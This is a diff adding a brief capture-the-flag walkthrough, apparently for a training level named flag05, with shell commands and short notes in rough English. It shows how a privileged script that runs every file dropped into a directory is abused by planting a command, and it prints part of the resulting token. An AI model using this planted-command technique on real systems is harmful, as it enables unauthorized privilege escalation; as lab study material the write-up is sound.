@@ -1,0 +1,22 @@
+$ find / -user flag05 2>/dev/null
+/usr/sbin/openarenaserver
+/rofs/usr/sbin/openarenaserver
+
+$ cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+
+for each file in opt/openarenaserver set a limit prosses
+the execute the cmd in the file
+
+echo "getflag > /tmp/gg" > /opt/openarenaserver/gg
+
+wait for the script
+
+$ cat /tmp/gg
+Check flag.Here is your token : viuaaale9[...]
